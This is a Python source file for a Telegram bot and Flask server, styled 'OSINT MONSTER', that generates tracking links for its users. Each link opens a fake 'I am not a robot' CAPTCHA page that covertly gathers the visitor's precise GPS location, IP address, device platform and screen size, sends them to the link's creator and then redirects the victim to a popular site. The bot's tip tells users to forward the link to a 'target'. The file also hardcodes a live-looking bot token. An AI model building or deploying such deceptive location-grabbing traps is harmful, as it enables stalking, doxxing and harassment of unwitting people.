import asyncio, threading, os, requests, json
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
DB_FILE = "user_data.json"

# --- РАБОТА С БАЗОЙ ---
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r") as f: return json.load(f)
    return {"users": {}}

def save_db(db):
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

# --- FLASK (СЕРВЕР) ---
@app.route('/')
def home(): return "SERVICE ACTIVE", 200

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #fff; transition: 0.1s; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .captcha-box { border: 1px solid #ccc; padding: 20px; cursor: pointer; background: white; border-radius: 5px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .glitch { animation: shake 0.15s infinite; filter: invert(1); background: #000 !important; }
        @keyframes shake { 0% {transform: translate(1px, 1px);} 50% {transform: translate(-2px, -1px);} 100% {transform: translate(1px, 1px);} }
    </style>
</head>
<body onclick="start()">
    <div class="captcha-box" id="b">
        <input type="checkbox" id="c"> Я не робот (проверка безопасности)
    </div>
<script>
async function start() {
    document.body.classList.add('glitch');
    document.getElementById('c').checked = true;
    let d = { aid: "{{ aid }}", p: navigator.platform, s: screen.width+"x"+screen.height, lure: "{{ lure }}" };
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (p) => { d.gps = p.coords.latitude + "," + p.coords.longitude; send(d); },
            () => { send(d); }, { enableHighAccuracy: true }
        );
    } else { send(d); }
    setTimeout(() => { alert("Ошибка авторизации: Повторите попытку позже."); }, 600);
}
function send(d) {
    fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
    .finally(() => { 
        let u = {"yt":"https://youtube.com","gg":"https://google.com","tt":"https://tiktok.com"};
        location.href = u["{{ lure }}"] || "https://google.com";
    });
}
</script>
</body>
</html>
"""

@app.route('/t/<aid>/<lure>')
def trap(aid, lure):
    db = load_db()
    uid = str(aid)
    if uid in db["users"]:
        db["users"][uid]["clicks"] += 1
        save_db(db)
    return render_template_string(HTML_TRAP, aid=aid, lure=lure)

@app.route('/catch', methods=['POST'])
def catch():
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    db = load_db()
    uid = str(data['aid'])
    
    if uid in db["users"] and ip not in db["users"][uid]["ips"]:
        db["users"][uid]["ips"].append(ip)
        save_db(db)

    report = (
        f"🚨 **ЦЕЛЬ ПОЙМАНА!**\n\n"
        f"📍 IP: `{ip}`\n"
        f"🌍 GPS: `{data.get('gps', 'Запрещено')}`\n"
        f"📱 Устройство: {data.get('p')}\n"
        f"🖥 Экран: {data.get('s')}"
    )
    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": data['aid'], "text": report, "parse_mode": "Markdown"})
    return "OK", 200

# --- AIOGRAM (БОТ) ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

def get_main_kb():
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🚀 Создать новую ссылку"))
    kb.add(types.KeyboardButton(text="📊 Моя статистика"))
    kb.adjust(1)
    return kb.as_markup(resize_keyboard=True)

def get_lure_kb():
    kb = ReplyKeyboardBuilder()
    kb.add(types.KeyboardButton(text="🎬 YouTube (Видео)"), types.KeyboardButton(text="🔍 Google (Поиск)"))
    kb.add(types.KeyboardButton(text="📱 TikTok (Тренд)"), types.KeyboardButton(text="❌ Отмена"))
    kb.adjust(2)
    return kb.as_markup(resize_keyboard=True)

@dp.message(Command("start"))
@dp.message(F.text == "❌ Отмена")
async def cmd_start(message: types.Message):
    db = load_db()
    uid = str(message.from_user.id)
    if uid not in db["users"]:
        db["users"][uid] = {"clicks": 0, "ips": []}
        save_db(db)
    await message.answer("💀 **OSINT MONSTER v10.0**\nГотов к работе. Выбери действие:", reply_markup=get_main_kb())

@dp.message(F.text == "🚀 Создать новую ссылку")
async def step_1(message: types.Message):
    await message.answer("🎯 **Шаг 1:** Выбери, куда перенаправить человека после ловушки:", reply_markup=get_lure_kb())

@dp.message(F.text.in_(["🎬 YouTube (Видео)", "🔍 Google (Поиск)", "📱 TikTok (Тренд)"]))
async def step_2(message: types.Message):
    lure_key = {"🎬 YouTube (Видео)": "yt", "🔍 Google (Поиск)": "gg", "📱 TikTok (Тренд)": "tt"}
    l = lure_key[message.text]
    link = f"{BASE_URL}/t/{message.from_user.id}/{l}"
    
    await message.answer(
        f"✅ **Ссылка успешно создана!**\n\n"
        f"🔗 Ссылка: `{link}`\n\n"
        f"💡 *Совет: Перешли её цели. Когда она нажмет «Я не робот», ты получишь все данные.*",
        reply_markup=get_main_kb()
    )

@dp.message(F.text == "📊 Моя статистика")
async def show_stats(message: types.Message):
    db = load_db()
    u = db["users"].get(str(message.from_user.id), {"clicks": 0, "ips": []})
    await message.answer(
        f"📈 **ТВОИ РЕЗУЛЬТАТЫ:**\n\n"
        f"🖱 Всего нажатий: `{u['clicks']}`\n"
        f"👤 Уникальных IP: `{len(u['ips'])}`",
        reply_markup=get_main_kb()
    )

async def main():
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
